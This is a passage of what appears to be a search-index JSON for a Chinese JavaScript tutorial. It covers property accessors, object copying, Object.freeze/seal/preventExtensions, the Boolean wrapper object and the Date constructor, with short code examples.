10 ; obj . next // 10 obj . next = 5 ; // Uncaught Error: \u65b0\u7684\u503c\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u503c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c next \u5c5e\u6027\u7684\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\uff0c\u90fd\u4f9d\u8d56\u4e8e\u5185\u90e8\u5c5e\u6027 $n \u3002","title":"\u5b58\u53d6\u5668"},{"location":"stdlib/attributes/#_5","text":"\u6709\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5c06\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u62f7\u8d1d\u5230\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u5b9e\u73b0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var extend = function ( to , from ) { for ( var property in from ) { to [ property ] = from [ property ]; } return to ; } extend ({}, { a : 1 }) // {a: 1} \u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u9047\u5230\u5b58\u53d6\u5668\u5b9a\u4e49\u7684\u5c5e\u6027\uff0c\u4f1a\u53ea\u62f7\u8d1d\u503c\u3002 1 2 3 4 extend ({}, { get a () { return 1 } }) // {a: 1} \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Object.defineProperty \u65b9\u6cd5\u6765\u62f7\u8d1d\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var extend = function ( to , from ) { for ( var property in from ) { if ( ! from . hasOwnProperty ( property )) continue ; Object . defineProperty ( to , property , Object . getOwnPropertyDescriptor ( from , property ) ); } return to ; } extend ({}, { get a (){ return 1 } }) // { get a(){ return 1 } }) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c hasOwnProperty \u90a3\u4e00\u884c\u7528\u6765\u8fc7\u6ee4\u6389\u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a Object.getOwnPropertyDescriptor \u8bfb\u4e0d\u5230\u7ee7\u627f\u5c5e\u6027\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002","title":"\u5bf9\u8c61\u7684\u62f7\u8d1d"},{"location":"stdlib/attributes/#_6","text":"\u6709\u65f6\u9700\u8981\u51bb\u7ed3\u5bf9\u8c61\u7684\u8bfb\u5199\u72b6\u6001\uff0c\u9632\u6b62\u5bf9\u8c61\u88ab\u6539\u53d8\u3002JavaScript \u63d0\u4f9b\u4e86\u4e09\u79cd\u51bb\u7ed3\u65b9\u6cd5\uff0c\u6700\u5f31\u7684\u4e00\u79cd\u662f Object.preventExtensions \uff0c\u5176\u6b21\u662f Object.seal \uff0c\u6700\u5f3a\u7684\u662f Object.freeze \u3002","title":"\u63a7\u5236\u5bf9\u8c61\u72b6\u6001"},{"location":"stdlib/attributes/#objectpreventextensions","text":"Object.preventExtensions \u65b9\u6cd5\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e0\u6cd5\u518d\u6dfb\u52a0\u65b0\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 var obj = new Object (); Object . preventExtensions ( obj ); Object . defineProperty ( obj , 'p' , { value : 'hello' }); // TypeError: Cannot define property:p, object is not extensible. obj . p = 1 ; obj . p // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u7ecf\u8fc7 Object.preventExtensions \u4ee5\u540e\uff0c\u5c31\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u4e86\u3002","title":"Object.preventExtensions()"},{"location":"stdlib/attributes/#objectisextensible","text":"Object.isExtensible \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.preventExtensions \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u6dfb\u52a0\u5c5e\u6027\u3002 1 2 3 4 5 var obj = new Object (); Object . isExtensible ( obj ) // true Object . preventExtensions ( obj ); Object . isExtensible ( obj ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 obj \u5bf9\u8c61\u4f7f\u7528 Object.preventExtensions \u65b9\u6cd5\u4ee5\u540e\uff0c\u518d\u4f7f\u7528 Object.isExtensible \u65b9\u6cd5\uff0c\u8fd4\u56de false \uff0c\u8868\u793a\u5df2\u7ecf\u4e0d\u80fd\u6dfb\u52a0\u65b0\u5c5e\u6027\u4e86\u3002","title":"Object.isExtensible()"},{"location":"stdlib/attributes/#objectseal","text":"Object.seal \u65b9\u6cd5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e2\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\uff0c\u4e5f\u65e0\u6cd5\u5220\u9664\u65e7\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var obj = { p : 'hello' }; Object . seal ( obj ); delete obj . p ; obj . p // \"hello\" obj . x = 'world' ; obj . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u6267\u884c Object.seal \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u548c\u5220\u9664\u65e7\u5c5e\u6027\u4e86\u3002 Object.seal \u5b9e\u8d28\u662f\u628a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u8bbe\u4e3a false \uff0c\u56e0\u6b64\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u4e0d\u518d\u80fd\u6539\u53d8\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var obj = { p : 'a' }; // seal\u65b9\u6cd5\u4e4b\u524d Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { // value: \"a\", // writable: true, // enumerable: true, // configurable: true // } Object . seal ( obj ); // seal\u65b9\u6cd5\u4e4b\u540e Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { // value: \"a\", // writable: true, // enumerable: true, // configurable: false // } Object . defineProperty ( obj , 'p' , { enumerable : false }) // TypeError: Cannot redefine property: p \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528 Object.seal \u65b9\u6cd5\u4e4b\u540e\uff0c\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u5c31\u53d8\u6210\u4e86 false \uff0c\u7136\u540e\u6539\u53d8 enumerable \u5c5e\u6027\u5c31\u4f1a\u62a5\u9519\u3002 Object.seal \u53ea\u662f\u7981\u6b62\u65b0\u589e\u6216\u5220\u9664\u5c5e\u6027\uff0c\u5e76\u4e0d\u5f71\u54cd\u4fee\u6539\u67d0\u4e2a\u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); obj . p = 'b' ; obj . p // 'b' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.seal \u65b9\u6cd5\u5bf9 p \u5c5e\u6027\u7684 value \u65e0\u6548\uff0c\u662f\u56e0\u4e3a\u6b64\u65f6 p \u5c5e\u6027\u7684\u53ef\u5199\u6027\u7531 writable \u51b3\u5b9a\u3002","title":"Object.seal()"},{"location":"stdlib/attributes/#objectissealed","text":"Object.isSealed \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.seal \u65b9\u6cd5\u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); Object . isSealed ( obj ) // true \u8fd9\u65f6\uff0c Object.isExtensible \u65b9\u6cd5\u4e5f\u8fd4\u56de false \u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); Object . isExtensible ( obj ) // false","title":"Object.isSealed()"},{"location":"stdlib/attributes/#objectfreeze","text":"Object.freeze \u65b9\u6cd5\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u3001\u65e0\u6cd5\u5220\u9664\u65e7\u5c5e\u6027\u3001\u4e5f\u65e0\u6cd5\u6539\u53d8\u5c5e\u6027\u7684\u503c\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u5bf9\u8c61\u5b9e\u9645\u4e0a\u53d8\u6210\u4e86\u5e38\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var obj = { p : 'hello' }; Object . freeze ( obj ); obj . p = 'world' ; obj . p // \"hello\" obj . t = 'hello' ; obj . t // undefined delete obj . p // false obj . p // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 obj \u5bf9\u8c61\u8fdb\u884c Object.freeze() \u4ee5\u540e\uff0c\u4fee\u6539\u5c5e\u6027\u3001\u65b0\u589e\u5c5e\u6027\u3001\u5220\u9664\u5c5e\u6027\u90fd\u65e0\u6548\u4e86\u3002\u8fd9\u4e9b\u64cd\u4f5c\u5e76\u4e0d\u62a5\u9519\uff0c\u53ea\u662f\u9ed8\u9ed8\u5730\u5931\u8d25\u3002\u5982\u679c\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5219\u4f1a\u62a5\u9519\u3002","title":"Object.freeze()"},{"location":"stdlib/attributes/#objectisfrozen","text":"Object.isFrozen \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.freeze \u65b9\u6cd5\u3002 1 2 3 4 5 6 var obj = { p : 'hello' }; Object . freeze ( obj ); Object . isFrozen ( obj ) // true \u4f7f\u7528 Object.freeze \u65b9\u6cd5\u4ee5\u540e\uff0c Object.isSealed \u5c06\u4f1a\u8fd4\u56de true \uff0c Object.isExtensible \u8fd4\u56de false \u3002 1 2 3 4 5 6 7 8 var obj = { p : 'hello' }; Object . freeze ( obj ); Object . isSealed ( obj ) // true Object . isExtensible ( obj ) // false Object.isFrozen \u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u786e\u8ba4\u67d0\u4e2a\u5bf9\u8c61\u6ca1\u6709\u88ab\u51bb\u7ed3\u540e\uff0c\u518d\u5bf9\u5b83\u7684\u5c5e\u6027\u8d4b\u503c\u3002 1 2 3 4 5 6 7 8 9 var obj = { p : 'hello' }; Object . freeze ( obj ); if ( ! Object . isFrozen ( obj )) { obj . p = 'world' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u786e\u8ba4 obj \u6ca1\u6709\u88ab\u51bb\u7ed3\u540e\uff0c\u518d\u5bf9\u5b83\u7684\u5c5e\u6027\u8d4b\u503c\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u4e86\u3002","title":"Object.isFrozen()"},{"location":"stdlib/attributes/#_7","text":"\u4e0a\u9762\u7684\u4e09\u4e2a\u65b9\u6cd5\u9501\u5b9a\u5bf9\u8c61\u7684\u53ef\u5199\u6027\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff1a\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u539f\u578b\u5bf9\u8c61\uff0c\u6765\u4e3a\u5bf9\u8c61\u589e\u52a0\u5c5e\u6027\u3002 1 2 3 4 5 6 7 var obj = new Object (); Object . preventExtensions ( obj ); var proto = Object . getPrototypeOf ( obj ); proto . t = 'hello' ; obj . t // hello \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u672c\u8eab\u4e0d\u80fd\u65b0\u589e\u5c5e\u6027\uff0c\u4f46\u662f\u53ef\u4ee5\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u4e0a\u65b0\u589e\u5c5e\u6027\uff0c\u5c31\u4f9d\u7136\u80fd\u591f\u5728 obj \u4e0a\u8bfb\u5230\u3002 \u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u662f\uff0c\u628a obj \u7684\u539f\u578b\u4e5f\u51bb\u7ed3\u4f4f\u3002 1 2 3 4 5 6 7 8 var obj = new Object (); Object . preventExtensions ( obj ); var proto = Object . getPrototypeOf ( obj ); Object . preventExtensions ( proto ); proto . t = 'hello' ; obj . t // undefined \u53e6\u5916\u4e00\u4e2a\u5c40\u9650\u662f\uff0c\u5982\u679c\u5c5e\u6027\u503c\u662f\u5bf9\u8c61\uff0c\u4e0a\u9762\u8fd9\u4e9b\u65b9\u6cd5\u53ea\u80fd\u51bb\u7ed3\u5c5e\u6027\u6307\u5411\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u80fd\u51bb\u7ed3\u5bf9\u8c61\u672c\u8eab\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 8 var obj = { foo : 1 , bar : [ 'a' , 'b' ] }; Object . freeze ( obj ); obj . bar . push ( 'c' ); obj . bar // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.bar \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u6570\u7ec4\uff0c obj \u5bf9\u8c61\u88ab\u51bb\u7ed3\u4ee5\u540e\uff0c\u8fd9\u4e2a\u6307\u5411\u65e0\u6cd5\u6539\u53d8\uff0c\u5373\u65e0\u6cd5\u6307\u5411\u5176\u4ed6\u503c\uff0c\u4f46\u662f\u6240\u6307\u5411\u7684\u6570\u7ec4\u662f\u53ef\u4ee5\u6539\u53d8\u7684\u3002","title":"\u5c40\u9650\u6027"},{"location":"stdlib/boolean/","text":"Boolean \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 Boolean \u5bf9\u8c61\u662f JavaScript \u7684\u4e09\u4e2a\u5305\u88c5\u5bf9\u8c61\u4e4b\u4e00\u3002\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u5b83\u4e3b\u8981\u7528\u4e8e\u751f\u6210\u5e03\u5c14\u503c\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u3002 1 2 3 4 var b = new Boolean ( true ); typeof b // \"object\" b . valueOf () // true \u4e0a\u9762\u4ee3\u7801\u7684\u53d8\u91cf b \u662f\u4e00\u4e2a Boolean \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u5b83\u7684\u7c7b\u578b\u662f\u5bf9\u8c61\uff0c\u503c\u4e3a\u5e03\u5c14\u503c true \u3002 \u6ce8\u610f\uff0c false \u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5e03\u5c14\u8fd0\u7b97\u7ed3\u679c\u4e5f\u662f true \u3002 1 2 3 4 5 6 7 if ( new Boolean ( false )) { console . log ( 'true' ); } // true if ( new Boolean ( false ). valueOf ()) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u4e4b\u6240\u4ee5\u5f97\u5230 true \uff0c\u662f\u56e0\u4e3a false \u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fdb\u884c\u903b\u8f91\u8fd0\u7b97\u65f6\uff0c\u88ab\u81ea\u52a8\u8f6c\u5316\u6210\u5e03\u5c14\u503c true \uff08\u56e0\u4e3a\u6240\u6709\u5bf9\u8c61\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff09\u3002\u800c\u5b9e\u4f8b\u7684 valueOf \u65b9\u6cd5\uff0c\u5219\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u5e94\u7684\u539f\u59cb\u503c\uff0c\u672c\u4f8b\u4e3a false \u3002 Boolean \u51fd\u6570\u7684\u7c7b\u578b\u8f6c\u6362\u4f5c\u7528 \u00b6 Boolean \u5bf9\u8c61\u9664\u4e86\u53ef\u4ee5\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u8fd9\u65f6 Boolean \u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u5de5\u5177\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Boolean ( undefined ) // false Boolean ( null ) // false Boolean ( 0 ) // false Boolean ( '' ) // false Boolean ( NaN ) // false Boolean ( 1 ) // true Boolean ( 'false' ) // true Boolean ([]) // true Boolean ({}) // true Boolean ( function () {}) // true Boolean ( /foo/ ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\u51e0\u79cd\u5f97\u5230 true \u7684\u60c5\u51b5\uff0c\u90fd\u503c\u5f97\u8ba4\u771f\u8bb0\u4f4f\u3002 \u987a\u4fbf\u63d0\u4e00\u4e0b\uff0c\u4f7f\u7528\u53cc\u91cd\u7684\u5426\u8fd0\u7b97\u7b26\uff08 ! \uff09\u4e5f\u53ef\u4ee5\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 !! undefined // false !! null // false !! 0 // false !! '' // false !! NaN // false !! 1 // true !! 'false' // true !! [] // true !! {} // true !! function (){} // true !! /foo/ // true \u6700\u540e\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c Boolean \u5bf9\u8c61\u524d\u9762\u52a0\u4e0d\u52a0 new \uff0c\u4f1a\u5f97\u5230\u5b8c\u5168\u76f8\u53cd\u7684\u7ed3\u679c\uff0c\u5fc5\u987b\u5c0f\u5fc3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if ( Boolean ( false )) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa if ( new Boolean ( false )) { console . log ( 'true' ); } // true if ( Boolean ( null )) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa if ( new Boolean ( null )) { console . log ( 'true' ); } // true","title":"Boolean \u5bf9\u8c61"},{"location":"stdlib/boolean/#boolean","text":"","title":"Boolean \u5bf9\u8c61"},{"location":"stdlib/boolean/#_1","text":"Boolean \u5bf9\u8c61\u662f JavaScript \u7684\u4e09\u4e2a\u5305\u88c5\u5bf9\u8c61\u4e4b\u4e00\u3002\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u5b83\u4e3b\u8981\u7528\u4e8e\u751f\u6210\u5e03\u5c14\u503c\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u3002 1 2 3 4 var b = new Boolean ( true ); typeof b // \"object\" b . valueOf () // true \u4e0a\u9762\u4ee3\u7801\u7684\u53d8\u91cf b \u662f\u4e00\u4e2a Boolean \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u5b83\u7684\u7c7b\u578b\u662f\u5bf9\u8c61\uff0c\u503c\u4e3a\u5e03\u5c14\u503c true \u3002 \u6ce8\u610f\uff0c false \u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5e03\u5c14\u8fd0\u7b97\u7ed3\u679c\u4e5f\u662f true \u3002 1 2 3 4 5 6 7 if ( new Boolean ( false )) { console . log ( 'true' ); } // true if ( new Boolean ( false ). valueOf ()) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u4e4b\u6240\u4ee5\u5f97\u5230 true \uff0c\u662f\u56e0\u4e3a false \u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fdb\u884c\u903b\u8f91\u8fd0\u7b97\u65f6\uff0c\u88ab\u81ea\u52a8\u8f6c\u5316\u6210\u5e03\u5c14\u503c true \uff08\u56e0\u4e3a\u6240\u6709\u5bf9\u8c61\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff09\u3002\u800c\u5b9e\u4f8b\u7684 valueOf \u65b9\u6cd5\uff0c\u5219\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u5e94\u7684\u539f\u59cb\u503c\uff0c\u672c\u4f8b\u4e3a false \u3002","title":"\u6982\u8ff0"},{"location":"stdlib/boolean/#boolean_1","text":"Boolean \u5bf9\u8c61\u9664\u4e86\u53ef\u4ee5\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u8fd9\u65f6 Boolean \u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u5de5\u5177\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 Boolean ( undefined ) // false Boolean ( null ) // false Boolean ( 0 ) // false Boolean ( '' ) // false Boolean ( NaN ) // false Boolean ( 1 ) // true Boolean ( 'false' ) // true Boolean ([]) // true Boolean ({}) // true Boolean ( function () {}) // true Boolean ( /foo/ ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\u51e0\u79cd\u5f97\u5230 true \u7684\u60c5\u51b5\uff0c\u90fd\u503c\u5f97\u8ba4\u771f\u8bb0\u4f4f\u3002 \u987a\u4fbf\u63d0\u4e00\u4e0b\uff0c\u4f7f\u7528\u53cc\u91cd\u7684\u5426\u8fd0\u7b97\u7b26\uff08 ! \uff09\u4e5f\u53ef\u4ee5\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 !! undefined // false !! null // false !! 0 // false !! '' // false !! NaN // false !! 1 // true !! 'false' // true !! [] // true !! {} // true !! function (){} // true !! /foo/ // true \u6700\u540e\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c Boolean \u5bf9\u8c61\u524d\u9762\u52a0\u4e0d\u52a0 new \uff0c\u4f1a\u5f97\u5230\u5b8c\u5168\u76f8\u53cd\u7684\u7ed3\u679c\uff0c\u5fc5\u987b\u5c0f\u5fc3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if ( Boolean ( false )) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa if ( new Boolean ( false )) { console . log ( 'true' ); } // true if ( Boolean ( null )) { console . log ( 'true' ); } // \u65e0\u8f93\u51fa if ( new Boolean ( null )) { console . log ( 'true' ); } // true","title":"Boolean \u51fd\u6570\u7684\u7c7b\u578b\u8f6c\u6362\u4f5c\u7528"},{"location":"stdlib/date/","text":"Date \u5bf9\u8c61 \u00b6 Date \u5bf9\u8c61\u662f JavaScript \u539f\u751f\u7684\u65f6\u95f4\u5e93\u3002\u5b83\u4ee5\u56fd\u9645\u6807\u51c6\u65f6\u95f4\uff08UTC\uff091970\u5e741\u67081\u65e500:00:00\u4f5c\u4e3a\u65f6\u95f4\u7684\u96f6\u70b9\uff0c\u53ef\u4ee5\u8868\u793a\u7684\u65f6\u95f4\u8303\u56f4\u662f\u524d\u540e\u54041\u4ebf\u5929\uff08\u5355\u4f4d\u4e3a\u6beb\u79d2\uff09\u3002 \u666e\u901a\u51fd\u6570\u7684\u7528\u6cd5 \u00b6 Date \u5bf9\u8c61\u53ef\u4ee5\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u76f4\u63a5\u8c03\u7528\uff0c\u8fd4\u56de\u4e00\u4e2a\u4ee3\u8868\u5f53\u524d\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u3002 1 2 Date () // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u6ce8\u610f\uff0c\u5373\u4f7f\u5e26\u6709\u53c2\u6570\uff0c Date \u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u4f7f\u7528\u65f6\uff0c\u8fd4\u56de\u7684\u8fd8\u662f\u5f53\u524d\u65f6\u95f4\u3002 1 2 Date ( 2000 , 1 , 1 ) // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u65e0\u8bba\u6709\u6ca1\u6709\u53c2\u6570\uff0c\u76f4\u63a5\u8c03\u7528 Date \u603b\u662f\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u3002 \u6784\u9020\u51fd\u6570\u7684\u7528\u6cd5 \u00b6 Date \u8fd8\u53ef\u4ee5\u5f53\u4f5c\u6784\u9020\u51fd\u6570\u4f7f\u7528\u3002\u5bf9\u5b83\u4f7f\u7528 new \u547d\u4ee4\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u52a0\u53c2\u6570\uff0c\u5b9e\u4f8b\u4ee3\u8868\u7684\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u3002 1 var today = new Date (); Date \u5b9e\u4f8b\u6709\u4e00\u4e2a\u72ec\u7279\u7684\u5730\u65b9\u3002\u5176\u4ed6\u5bf9\u8c61\u6c42\u503c\u7684\u65f6\u5019\uff0c\u90fd\u662f\u9ed8\u8ba4\u8c03\u7528 .valueOf() \u65b9\u6cd5\uff0c\u4f46\u662f Date \u5b9e\u4f8b\u6c42\u503c\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u8c03\u7528\u7684\u662f toString() \u65b9\u6cd5\u3002\u8fd9\u5bfc\u81f4\u5bf9 Date \u5b9e\u4f8b\u6c42\u503c\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u8be5\u5b9e\u4f8b\u5bf9\u5e94\u7684\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 var today = new Date (); today // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" // \u7b49\u540c\u4e8e today . toString () // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c today \u662f Date \u7684\u5b9e\u4f8b\uff0c\u76f4\u63a5\u6c42\u503c\u7b49\u540c\u4e8e\u8c03\u7528 toString \u65b9\u6cd5\u3002 \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u65f6\uff0c Date \u5bf9\u8c61\u53ef\u4ee5\u63a5\u53d7\u591a\u79cd\u683c\u5f0f\u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u8be5\u53c2\u6570\u5bf9\u5e94\u7684\u65f6\u95f4\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u53c2\u6570\u4e3a\u65f6\u95f4\u96f6\u70b9\u5f00\u59cb\u8ba1\u7b97\u7684\u6beb\u79d2\u6570 new Date ( 1378218728000 ) // Tue Sep 03 2013 22:32:08 GMT+0800 (CST) // \u53c2\u6570\u4e3a\u65e5\u671f\u5b57\u7b26\u4e32 new Date ( 'January 6, 2013' ); // Sun Jan 06 2013 00:00:00 GMT+0800 (CST) // \u53c2\u6570\u4e3a\u591a\u4e2a\u6574\u6570\uff0c // \u4ee3\u8868\u5e74\u3001\u6708\u3001\u65e5\u3001\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2\u3001\u6beb\u79d2 new Date ( 2013 , 0 , 1 , 0 , 0 , 0 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) \u5173\u4e8e Date \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\uff0c\u6709\u51e0\u70b9\u8bf4\u660e\u3002 \u7b2c\u4e00\u70b9\uff0c\u53c2\u6570\u53ef\u4ee5\u662f\u8d1f\u6574\u6570\uff0c\u4ee3\u88681970\u5e74\u5143\u65e6\u4e4b\u524d\u7684\u65f6\u95f4\u3002 1 2 new Date ( - 1378218728000 ) // Fri Apr 30 1926 17:27:52 GMT+0800 (CST) \u7b2c\u4e8c\u70b9\uff0c\u53ea\u8981\u662f\u80fd\u88ab Date.parse() \u65b9\u6cd5\u89e3\u6790\u7684\u5b57\u7b26\u4e32\uff0c\u90fd\u53ef\u4ee5\u5f53\u4f5c\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 new Date ( '2013-2-15' ) new Date ( '2013/2/15' ) new Date ( '02/15/2013' ) new Date ( '2013-FEB-15' ) new Date ( 'FEB, 15, 2013' ) new Date ( 'FEB 15, 2013' ) new Date ( 'February, 15, 2013' ) new Date ( 'February 15, 2013' ) new Date ( '15 Feb 2013' ) new Date ( '15, February, 2013' ) // Fri Feb 15 2013 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u591a\u79cd\u65e5\u671f\u5b57\u7b26\u4e32\u7684\u5199\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u65f6\u95f4\u3002 